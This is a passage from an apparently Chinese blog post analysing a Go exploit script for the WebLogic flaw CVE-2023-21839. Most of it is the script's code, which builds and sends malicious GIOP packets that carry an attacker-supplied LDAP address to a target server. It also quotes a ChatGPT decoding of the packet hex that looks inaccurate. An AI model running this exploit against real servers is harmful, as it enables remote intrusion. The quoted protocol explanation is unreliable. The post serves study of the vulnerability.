class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>KeyAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        KeyAddress<span class=\"token punctuation\">:</span>    giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>NameService<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    giop<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"LocateRequest\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>locateRequest2<span class=\"token punctuation\">.</span><span class=\"token function\">Bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    buf <span class=\"token operator\">=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n\n    resolve <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>ResolveRequest<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        Header<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>Header<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            Magic<span class=\"token punctuation\">:</span>        giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>GIOP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            MajorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MajorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MinorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MinorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageFlags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageType<span class=\"token punctuation\">:</span>  <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>RequestType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        RequestId<span class=\"token punctuation\">:</span>        giop<span class=\"token punctuation\">.</span><span class=\"token function\">Int32</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        ResponseFlags<span class=\"token punctuation\">:</span>    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>WithTargetScope<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        TargetAddress<span class=\"token punctuation\">:</span>    giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>KeyAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        KeyAddress<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>wlsKey1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        RequestOperation<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>ResolveOp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        ServiceContextList<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>ServiceContextList<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            SequenceLength<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">Int32</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            ServiceContext<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>giop<span class=\"token punctuation\">.</span>ServiceContext<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                ServiceContext0<span class=\"token punctuation\">,</span>\n                ServiceContext1<span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                    VSCID<span class=\"token punctuation\">:</span>      giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"424541\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    SCID<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"03\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    Endianness<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                    Data<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"00000000000000\"</span> <span class=\"token operator\">+</span> key2 <span class=\"token operator\">+</span> <span class=\"token string\">\"00000000\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                ServiceContext2<span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        CosNamingDissector<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"00000000000000010000000574657374000000000000000100\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    giop<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ResolveRequest\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">.</span><span class=\"token function\">Bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    buf <span class=\"token operator\">=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n\n    resolveTwice <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>ResolveRequest<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        Header<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>Header<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            Magic<span class=\"token punctuation\">:</span>        giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>GIOP<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            MajorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MajorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MinorVersion<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>MinorVersion<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageFlags<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n            MessageType<span class=\"token punctuation\">:</span>  <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>RequestType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        RequestId<span class=\"token punctuation\">:</span>        giop<span class=\"token punctuation\">.</span><span class=\"token function\">Int32</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        ResponseFlags<span class=\"token punctuation\">:</span>    <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>WithTargetScope<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        TargetAddress<span class=\"token punctuation\">:</span>    giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>KeyAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        KeyAddress<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>wlsKey2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        RequestOperation<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span>giop<span class=\"token punctuation\">.</span>ResolveOp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        ServiceContextList<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span>giop<span class=\"token punctuation\">.</span>ServiceContextList<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n            SequenceLength<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">Int32</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            ServiceContext<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>giop<span class=\"token punctuation\">.</span>ServiceContext<span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                ServiceContext0<span class=\"token punctuation\">,</span>\n                ServiceContext1<span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n                    VSCID<span class=\"token punctuation\">:</span>      giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"424541\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    SCID<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"03\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    Endianness<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>giop<span class=\"token punctuation\">.</span>BigEndianType<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                    Data<span class=\"token punctuation\">:</span>       giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"00000000000000\"</span> <span class=\"token operator\">+</span> key2 <span class=\"token operator\">+</span> <span class=\"token string\">\"00000000\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n                ServiceContext2<span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">,</span>\n        CosNamingDissector<span class=\"token punctuation\">:</span> giop<span class=\"token punctuation\">.</span><span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"00000000000000010000000574657374000000000000000100\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    giop<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ResolveRequest\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>resolveTwice<span class=\"token punctuation\">.</span><span class=\"token function\">Bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    buf <span class=\"token operator\">=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n    <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n\n    err <span class=\"token operator\">=</span> conn<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>开始看到这个脚本让我非常困惑，其中最多的就是奇奇怪怪的数字，后面问了问chatgpt才知道</p>\n<p>如</p>\n<pre><code>CosNamingDissector: giop.D(&quot;00000000000000010000000574657374000000000000000100&quot;)\n</code></pre>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>它表示一个GIOP（General Inter-ORB Protocol）消息的二进制编码。GIOP是CORBA（Common Object Request Broker Architecture）规范中定义的一种通信协议，用于在分布式对象系统中进行通信。</p>\n<p>具体来说，这个字节数组表示一个GIOP消息的头部，包括以下信息：</p>\n<ul>\n<li>00000000 00000001：GIOP版本号，这里表示版本1.0</li>\n<li>00000000 00000101：GIOP消息标志，这里表示请求消息</li>\n<li>74657374：GIOP消息类型，这里表示一个字符串消息</li>\n<li>00000000 00000001：请求消息的标识符，这里为1</li>\n</ul></blockquote>\n<p>该go脚本流程大致为</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ol>\n<li>解析命令行参数（IP地址、端口、LDAP字符串）</li>\n<li>获取Weblogic版本号</li>\n<li>根据Weblogic版本号设置密钥</li>\n<li>连接到Weblogic服务器</li>\n<li>设置ServiceContext</li>\n<li>构造恶意数据包</li>\n<li>发送恶意数据包</li>\n<li>关闭连接</li>\n</ol></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>代码中的 import 语句引用了四个不同的包：</p>\n<p><code>CVE-2023-21839</code><br><code>encoding/binary</code><br><code>encoding/hex</code><br><code>flag</code><br><code>fmt</code><br><code>net</code><br><code>strings</code><br>其中， flag 用于解析命令行参数。 net 用于处理网络连接。 strings 用于字符串处理。encoding&#x2F;hex 用于十六进制编码&#x2F;解码，encoding&#x2F;binary 用于处理二进制数据。</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>main() 函数开始时解析命令行参数并打印相应的提示信息。然后调用 <code>giop.GetVersion()</code> 函数检测 WebLogic 服务器的版本。分析完版本后然后根据 <code>WebLogic</code> 版本选择不同的攻击方式，分别设置变量 <code>wlsKey1</code> 和 <code>wlsKey2</code>，最后使用 <code>net.Dial()</code> 函数建立与 <code>WebLogic</code> 服务器的连接。</p></blockquote>\n<pre class=\" language-go\"><code class=\"language-go\"><span class=\"token keyword\">package</span> giop\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"encoding/binary\"</span>\n    <span class=\"token string\">\"encoding/hex\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">D</span><span class=\"token punctuation\">(</span>str <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span>\n    data<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">:=</span> hex<span class=\"token punctuation\">.</span><span class=\"token function\">DecodeString</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">E</span><span class=\"token punctuation\">(</span>b <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> 